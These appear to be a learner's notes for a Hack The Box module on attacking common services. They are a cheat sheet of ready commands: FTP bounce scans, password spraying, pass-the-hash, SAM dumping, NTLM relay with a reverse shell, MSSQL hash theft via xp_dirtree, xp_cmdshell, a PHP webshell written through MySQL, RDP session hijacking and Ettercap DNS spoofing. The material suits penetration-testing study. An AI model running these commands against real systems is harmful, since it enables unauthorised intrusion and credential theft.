# Attacking Common Services

## **Attacking FTP**

| Command                                                                                       | Description                                        |
| --------------------------------------------------------------------------------------------- | -------------------------------------------------- |
| ftp 192.168.2.142                                                                             | Connecting to the FTP server using the ftp client. |
| nc -v 192.168.2.142 21                                                                        | Connecting to the FTP server using netcat.         |
| hydra -l user1 -P /usr/share/wordlists/rockyou.txt [ftp://192.168.2.142](ftp://192.168.2.142) | Brute-forcing the FTP service.                     |

#### **FTP Bounce Attack**

An FTP bounce attack is a network attack that uses FTP servers to deliver outbound traffic to another device on the network.

Consider we are targetting an FTP Server `FTP_DMZ` exposed to the internet. Another device within the same network, `Internal_DMZ`, is not exposed to the internet. We can use the connection to the `FTP_DMZ` server to scan `Internal_DMZ` using the FTP Bounce attack and obtain information about the server's open ports. Then, we can use that information as part of our attack against the infrastructure.

```bash
dollarboysushil@htb[/htb]$ nmap -Pn -v -n -p80 -b <anonymous:password@10.10.110.213> 172.17.0.2Starting Nmap 7.80 ( <https://nmap.org> ) at 2020-10-27 04:55 EDT
Resolved FTP bounce attack proxy to 10.10.110.213 (10.10.110.213).
Attempting connection to <ftp://anonymous:password@10.10.110.213:21>
Connected:220 (vsFTPd 3.0.3)
Login credentials accepted by FTP server!
Initiating Bounce Scan at 04:55
FTP command misalignment detected ... correcting.
Completed Bounce Scan at 04:55, 0.54s elapsed (1 total ports)
Nmap scan report for 172.17.0.2
Host is up.

PORT   STATE  SERVICE
80/tcp open http

<SNIP>
```

## **Attacking SMB & RPC**

SMB can be configured not to require authentication, which is often called a `null session`. Instead, we can log in to a system with no username or password

| Command                                                                                                        | Description                                                         |
| -------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------- |
| smbclient -N -L [//10.129.14.128](https://10.129.14.128)                                                       | Null-session testing against the SMB service.                       |
| smbmap -H 10.129.14.128                                                                                        | Network share enumeration using smbmap.                             |
| smbmap -H 10.129.14.128 -r notes                                                                               | Recursive network share enumeration using smbmap.                   |
| smbmap -H 10.129.14.128 --download "notes\note.txt"                                                            | Download a specific file from the shared folder.                    |
| smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"                                                     | Upload a specific file to the shared folder.                        |
|                                                                                                                |                                                                     |
|                                                                                                                |                                                                     |
| rpcclient -U'%' 10.10.110.17                                                                                   | Null-session with the rpcclient.                                    |
| ./enum4linux-ng.py 10.10.11.45 -A -C                                                                           | Automated enumeratition of the SMB service using enum4linux-ng.     |
| crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!'                                             | Password spraying against different users from a list.              |
| impacket-psexec administrator:'Password123!'@10.10.110.17                                                      | Connect to the SMB service using the impacket-psexec.               |
| crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec             | Execute a command over the SMB service using crackmapexec.          |
| crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users                            | Enumerating Logged-on users.                                        |
| crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam                                         | Extract hashes from the SAM database.                               |
| crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE                             | Use the Pass-The-Hash technique to authenticate on the target host. |
| impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146                                             | Dump the SAM database using impacket-ntlmrelayx.                    |
| impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e \<base64 reverse shell> | Execute a PowerShell based reverse shell using impacket-ntlmrelayx. |

`crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth`

if we are targetting a non-domain joined computer, we will need to use the option `--local-auth`.

## **Attacking SQL Databases**

### **Capture MSSQL Service Hash**

First setup smb server

* `sudo responder -I tun0` → smbserver using responder
* `sudo impacket-smbserver share ./ -smb2support` → smbserver using impacket

Then execute this mssql query

#### **XP\_DIRTREE Hash Stealing**

```
1> EXEC master..xp_dirtree '\\\\10.10.110.17\\share\\'
2> GO

subdirectory    depth
--------------- -----------

```

#### **XP\_SUBDIRS Hash Stealing**

```
1> EXEC master..xp_subdirs '\\\\10.10.110.17\\share\\'
2> GO

HResult 0x55F6, Level 16, State 1
xp_subdirs could not access '\\\\10.10.110.17\\share\\*.*': FindFirstFile() returned error 5, 'Access is denied.'

```

If the service account has access to our server, we will obtain its hash. We can then attempt to crack the hash or relay it to another host.

## **Impersonate Existing Users with MSSQL**

SQL Server has a special permission, named `IMPERSONATE`, that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends.

#### **Identify Users that We Can Impersonate**

```
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO

name
-----------------------------------------------
sa
ben
valentin

(3 rows affected)

```

To get an idea of privilege escalation possibilities, let's verify if our current user has the sysadmin role:

#### **Verifying our Current User and Role**

```
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go

-----------
julio

```

#### **Impersonating the SA User**

```
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO

-----------
sa
```

### **Attacking SQL Databases**

| Command                                                                                                                     | Description                                                                                                   |
| --------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------- |
| mysql -u julio -pPassword123 -h 10.129.20.13                                                                                | Connecting to the MySQL server.                                                                               |
| sqlcmd -S SRVMSSQL\SQLEXPRESS -U julio -P 'MyPassword!' -y 30 -Y 30                                                         | Connecting to the MSSQL server.                                                                               |
| sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h                                                                           | Connecting to the MSSQL server from Linux.                                                                    |
| sqsh -S 10.129.203.7 -U .\\\julio -P 'MyPassword!' -h                                                                       | Connecting to the MSSQL server from Linux while Windows Authentication mechanism is used by the MSSQL server. |
| mysql> SHOW DATABASES;                                                                                                      | Show all available databases in MySQL.                                                                        |
| mysql> USE htbusers;                                                                                                        | Select a specific database in MySQL.                                                                          |
| mysql> SHOW TABLES;                                                                                                         | Show all available tables in the selected database in MySQL.                                                  |
| mysql> SELECT \* FROM users;                                                                                                | Select all available entries from the "users" table in MySQL.                                                 |
| sqlcmd> SELECT name FROM master.dbo.sysdatabases                                                                            | Show all available databases in MSSQL.                                                                        |
| sqlcmd> USE htbusers                                                                                                        | Select a specific database in MSSQL.                                                                          |
| sqlcmd> SELECT \* FROM htbusers.INFORMATION\_SCHEMA.TABLES                                                                  | Show all available tables in the selected database in MSSQL.                                                  |
| sqlcmd> SELECT \* FROM users                                                                                                | Select all available entries from the "users" table in MSSQL.                                                 |
| sqlcmd> EXECUTE sp\_configure 'show advanced options', 1                                                                    | To allow advanced options to be changed.                                                                      |
| sqlcmd> EXECUTE sp\_configure 'xp\_cmdshell', 1                                                                             | To enable the xp\_cmdshell.                                                                                   |
| sqlcmd> RECONFIGURE                                                                                                         | To be used after each sp\_configure command to apply the changes.                                             |
| sqlcmd> xp\_cmdshell 'whoami'                                                                                               | Execute a system command from MSSQL server.                                                                   |
| mysql> SELECT "\<?php echo shell\_exec($\_GET\['c']);?>" INTO OUTFILE '/var/www/html/webshell.php'                          | Create a file using MySQL.                                                                                    |
| mysql> show variables like "secure\_file\_priv";                                                                            | Check if the the secure file privileges are empty to read locally stored files on the system.                 |
| sqlcmd> SELECT \* FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE\_CLOB) AS Contents                  | Read local files in MSSQL.                                                                                    |
| mysql> select LOAD\_FILE("/etc/passwd");                                                                                    | Read local files in MySQL.                                                                                    |
| sqlcmd> EXEC master..xp\_dirtree '\\\10.10.110.17\share\\'                                                                  | Hash stealing using the xp\_dirtree command in MSSQL.                                                         |
| sqlcmd> EXEC master..xp\_subdirs '\\\10.10.110.17\share\\'                                                                  | Hash stealing using the xp\_subdirs command in MSSQL.                                                         |
| sqlcmd> SELECT srvname, isremote FROM sysservers                                                                            | Identify linked servers in MSSQL.                                                                             |
| sqlcmd> EXECUTE('select @@servername, @@version, system\_user, is\_srvrolemember(''sysadmin'')') AT \[10.0.0.12\SQLEXPRESS] | Identify the user and its privileges used for the remote connection in MSSQL.                                 |

## Attacking RDP

* `crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'` → rdp password spraying
* `hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp`

then login with `xfreerdp`

### **RDP Session Hijacking (this method does not work on server 2019)**

* `query user`

<figure><img src=".gitbook/assets/Untitled (15).png" alt=""><figcaption></figcaption></figure>

we are currently logged in as use `juurena` and has `Administrator` privileges. Our goal is to hijack the user `lewen` who is logged in via RDP

For this we should have system privileges and use the Microsoft `tscon.exe` binary.

`C:\\htb> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}`

→ If we are local administrator, we can use several methods to obtain SYSTEM privileges such as `mimikatz` or `PsExec`

one simple trick is to create a windows service, that, by default will run as local system and will execute any binary with system privileges

We will use [Microsoft sc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create) binary. First, we specify the service name (`sessionhijack`) and the `binpath`, which is the command we want to execute. Once we run the following command, a service named `sessionhijack` will be created.

```
C:\\htb> query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
 lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM

C:\\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"

[SC] CreateService SUCCESS
```

*   `net start sessionhijack` → to run the service

    this will launch new terminal with target user sessions.

\<aside> 💡 _Note: This method no longer works on Server 2019._

\</aside>

### **RDP Pass-the-Hash (PtH)**

if we don't get the plain text password, but have hash value of users password and could not crack it, we can use this method to get RDP.

There are few caveats to this attacks

<figure><img src=".gitbook/assets/Untitled (17).png" alt=""><figcaption></figcaption></figure>

• `Restricted Admin Mode`, which is disabled by default, should be enabled on the target host; otherwise, we will be prompted with the following error:

This can be enabled by adding a new registry key `DisableRestrictedAdmin` (REG\_DWORD) under `HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Lsa`. It can be done using the following command:

`C:\\htb> reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`

Then we can use `xfreerdp` to pass the hash

* `xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9`

## Attacking DNS

#### **DNS Zone Transfer**

A DNS zone is a portion of the DNS namespace that a specific organization or administrator manages.

* `dig AXFR @ns1.inlanefreight.htb inlanefreight.htb`
* `fierce --domain zonetransfer.me` → tools like fierce can also be used to enumerate all DNS servers of root domain

#### **Domain Takeovers & Subdomain Enumeration**

#### `Domain takeover` is registering a non-existent domain name to gain control over another domain. If attackers find an expired domain, they can claim that domain to perform further attacks such as hosting malicious content on a website or sending a phishing email leveraging the claimed domain.

**Subdomain Enumeration**

tools `subfinder`, `DNSdumster` , `sublist3r`

* `./subfinder -d inlanefreight.com -v`
* another alternative is [Subbrute](https://github.com/TheRook/subbrute).
  * `./subbrute inlanefreight.com -s ./names.txt -r ./resolvers.txt`

## **DNS Spoofing or DNS Cache Poisoning**

This attack involves altering legitimate DNS records with false information so that they can be used to redirect online traffic to a fraudulent website.

#### **Local DNS Cache Poisoning**

From a local network perspective, an attacker can also perform DNS Cache Poisoning using MITM tools like [Ettercap](https://www.ettercap-project.org/) or [Bettercap](https://www.bettercap.org/).

To exploit the DNS cache poisoning via `Ettercap`, we should first edit the `/etc/ettercap/etter.dns` file to map the target domain name (e.g., `inlanefreight.com`) that they want to spoof and the attacker's IP address (e.g., `192.168.225.110`) that they want to redirect a user to:

```
[!bash!]# cat /etc/ettercap/etter.dnsinlanefreight.com      A   192.168.225.110
*.inlanefreight.com    A   192.168.225.110
```

Next, start the `Ettercap` tool and scan for live hosts within the network by navigating to `Hosts > Scan for Hosts`. Once completed, add the target IP address (e.g., `192.168.152.129`) to Target1 and add a default gateway IP (e.g., `192.168.152.2`) to Target2.

<figure><img src=".gitbook/assets/Untitled (18).png" alt=""><figcaption></figcaption></figure>

Activate `dns_spoof` attack by navigating to `Plugins > Manage Plugins`. This sends the target machine with fake DNS responses that will resolve `inlanefreight.com` to IP address `192.168.225.110`:

After a successful DNS spoof attack, if a victim user coming from the target machine `192.168.152.129` visits the `inlanefreight.com` domain on a web browser, they will be redirected to a `Fake page` that is hosted on IP address `192.168.225.110`:

In addition, a ping coming from the target IP address `192.168.152.129` to `inlanefreight.com` should be resolved to `192.168.225.110` as well

## Attacking SMTP

<figure><img src=".gitbook/assets/Untitled (19).png" alt=""><figcaption></figcaption></figure>

* We can use tool \[`smtp-user-enum](<https://github.com/pentestmonkey/smtp-user-enum>).`
  * `smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7`
* [O365spray](https://github.com/0xZDH/o365spray) is a username enumeration and password spraying tool aimed at Microsoft Office 365 (O365) developed by [ZDH](https://twitter.com/0xzdh).
  * `python3 o365spray.py --validate --domain msplaintext.xyz` → check if target domain is using Office 365
  * `python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz` → attempt to identify usernames

## **Password Attacks**

* `hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3`
* `python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz`

### Solution of the Questions and Skill Assessment are not published due to HTB Terms and Condition



If you are having problem with question or skill assessment, contact me here

_**Instagram**_ [_dollarboysushil_](https://instagram.com/dollarboysushil)\
_**Twitter (X)**_ [_dollarboysushil_](https://twitter.com/dollarboysushil)\
_**Youtube**_ [_dollarboysushil_](https://youtube.com/dollarboysushil)\
_**Linkedin**_ [_dollarboysushil_](https://www.linkedin.com/in/dollarboysushil/)\
_**Discord**_ [_https://discord.gg/5jpkdeV_](https://discord.gg/5jpkdeV)
